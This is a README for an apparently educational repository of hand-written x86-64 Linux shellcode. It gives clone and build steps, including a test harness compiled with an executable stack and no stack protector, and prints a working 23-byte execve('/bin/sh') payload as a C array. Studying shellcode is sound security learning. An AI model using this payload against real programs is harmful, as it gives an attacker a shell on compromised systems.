# SHELLCODE SAFEHOUSE
Hello folks, this safehouse contains some custom shellcode targetting intel x86-64 CPU on Linux platform.

##  CLONING
To clone the repository on your local machine, isuue the bellow given command -
```
critical@d3ad:~$ git clone https://github.com/compilepeace/SHELLCODING_INTEL_x86-64
Cloning into 'SHELLCODING_INTEL_x86-64'...
remote: Enumerating objects: 74, done.
remote: Counting objects: 100% (74/74), done.
remote: Compressing objects: 100% (53/53), done.
remote: Total 74 (delta 24), reused 68 (delta 18), pack-reused 0
Unpacking objects: 100% (74/74), done.

```


##  USAGE
To generate shellcode on your own just enter the `make` command to assemble into object code as bellow -
```
critical@d3ad:~SHELLCODING_INTEL_x86-64$ make
gcc -Wl,-N -nostdlib -static exit.s -o exit.elf
objcopy --dump-section .text=exit.raw exit.elf
...
objcopy --dump-section .text=execve_binsh.raw execve_binsh.elf
gcc -z execstack -fno-stack-protector harness.c -o harness.elf
```
To remove all object files generated, issue the bellow given commands -
```
critical@d3ad:~SHELLCODING_INTEL_x86-64$ make clean
rm -f *.elf *.raw
```
To convert shellcode in C-style arrays from raw bytes -
```
critical@d3ad:~SHELLCODING_INTEL_x86-64$ xxd -i ./execve_binsh.raw
unsigned char __execve_binsh_raw[] = {
  0x31, 0xf6, 0x31, 0xd2, 0x52, 0x48, 0xbf, 0x2f, 0x2f, 0x62, 0x69, 0x6e,
  0x2f, 0x73, 0x68, 0x57, 0x54, 0x5f, 0x6a, 0x3b, 0x58, 0x0f, 0x05
};
unsigned int __execve_binsh_raw_len = 23;
``` 

Any suggestions to shellcode optimisation are welcomed, feel free to open up issues, cheers !

You can also email me regarding any queries,<br>
**NAME** : **ABHINAV THAKUR**<br>
**EMAIL**: **compilepeace@gmail.com**


[SHELLCODE_SAMPLES]: ./SHELLCODE_SAMPLES
[test_shellcode.c]: ./test_shellcode.c
